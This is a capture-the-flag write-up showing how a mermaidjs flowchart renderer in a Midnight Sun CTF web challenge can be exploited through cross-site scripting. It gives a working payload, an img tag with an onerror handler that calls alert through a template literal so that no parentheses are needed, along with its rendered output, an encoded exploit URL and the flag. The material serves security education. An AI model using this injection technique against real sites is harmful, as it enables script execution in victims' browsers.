---
tags: ["xxs", "mermaidjs"]
---
# Challenge
> Fine, I'll use a damn lib. Let's see if it's any better.

This challenge is based on the same setup as marcodowno. Instead of converting markdown, this challenge converts mermaidjs[1] charts to HTML.

# Solution

Let's have a look at the first example on the mermaidjs page and check how it its parsed.

```
graph TD;
    A-->B;
```

This input is parsed using the flowchart parser[2] written in a bison-like language.
A few of the parsing rules look promising:

`textToken` consumes a bunch interesting characters that are dumped as-is into the HTML output: ```<>[]"'`:.-``
Parentheses are not allowed though so we'll have to improvise on the `alert(1)` call:

ES2015 template literals[3] can be used to call functions without using parentheses.
```alert`1` ``` is equivalent to `alert(["1"])` and by string coercion equivalent to `alert('1')`.

Here's the final payload:

```
graph LR;
    X-->Y[Y<img src=x onerror='alert`1`' />];
```

This is the relevant output produced:

```html
<div xmlns="http://www.w3.org/1999/xhtml" style="display: inline-block; white-space: nowrap;">Y<img src="x" onerror="alert`1`"></div>
```

http://marcozuckerbergo-01.play.midnightsunctf.se:3002/markdown?input=%67%72%61%70%68%20%4c%52%3b%0a%20%20%20%20%58%2d%2d%3e%59%5b%59%3c%69%6d%67%20%73%72%63%3d%78%20%6f%6e%65%72%72%6f%72%3d%27%61%6c%65%72%74%60%31%60%27%20%2f%3e%5d%3b

midnight{1_gu3zz_7rust1ng_l1bs_d1dnt_w0rk_3ither:(}

# References
- [1] https://mermaidjs.github.io/
- [2] https://github.com/knsv/mermaid/blob/master/src/diagrams/flowchart/parser/flow.jison
- [3] https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals
